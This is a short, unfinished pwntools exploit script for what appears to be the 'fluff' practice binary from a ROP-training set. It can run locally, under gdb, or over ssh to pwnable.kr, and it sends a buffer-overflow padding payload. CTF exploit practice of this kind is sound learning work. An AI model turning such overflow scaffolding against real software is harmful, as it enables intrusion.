from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


libc_name="libfluff.so"
libc = ELF(f"./{libc_name}")
binary_name = "fluff"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e

def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            libc = ELF(f"./{libc_name}")
            # or if using ssh:
            s = ssh(user='',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x400616", aslr=False)
        else:
            p = process(f"./{binary_name}")

    overwrite_register = b"B" *8
    payload = b"A" * ( 0x20) + overwrite_register 

    # functions
    ret =p64(0x400616)



    p.send(payload)

    

main()

